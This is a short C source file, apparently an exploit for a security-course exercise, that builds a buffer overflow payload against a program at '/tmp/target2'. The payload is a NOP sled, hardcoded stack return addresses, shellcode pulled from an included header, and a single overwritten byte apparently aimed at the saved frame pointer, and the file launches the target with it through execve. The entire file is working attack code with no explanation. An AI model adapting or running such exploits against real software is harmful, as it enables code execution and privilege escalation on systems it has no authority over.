#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1];
  char buffer[168];
  
  memset(buffer, 0x90, 161);
  strncpy(buffer, "\x1c\xfd\xff\xbf", 4);
  strncpy(buffer + 4, "\x20\xfd\xff\xbf", 4);
  strncpy(buffer + 115, shellcode, 45);
  strncpy(buffer + 160, "\x18", 1);
  args[0] = TARGET; args[1] = buffer; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
